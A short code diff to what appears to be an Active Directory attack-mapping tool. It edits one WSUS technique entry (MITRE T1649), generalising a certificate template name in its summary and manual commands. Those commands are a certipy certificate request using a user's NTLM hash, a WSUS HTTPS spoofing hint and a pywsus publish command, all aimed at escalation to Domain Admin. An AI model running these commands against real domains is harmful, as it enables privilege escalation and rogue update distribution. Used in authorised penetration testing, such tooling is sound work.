@@ -33,12 +33,12 @@ WSUS_TECHNIQUES: dict[str, WsusTechnique] = {
         severity="critical",
         mitre_id="T1649",
         summary=(
-            "Enroll a restricted template (e.g. UpdateSrv), then abuse WSUS toward DA. "
+            "Enroll a restricted template (Server Auth), then abuse WSUS toward DA. "
             "Server-Authentication-only templates cannot be used for certipy auth / PKINIT login."
         ),
         manual_commands=(
-            "certipy req -u <user>@<domain> -hashes :<NTLM> -ca <CA> -template UpdateSrv -dns <wsus_fqdn>",
-            "# UpdateSrv EKU = Server Auth only — skip certipy auth; use cert for WSUS HTTPS spoofing",
+            "certipy req -u <user>@<domain> -hashes :<NTLM> -ca <CA> -template <template> -dns <wsus_fqdn>",
+            "# EKU = Server Auth only — skip certipy auth; use cert for WSUS HTTPS spoofing",
             "admapper wsus show wsus-004",
             "python3 pywsus.py -s <wsus_host> publish ...",
         ),
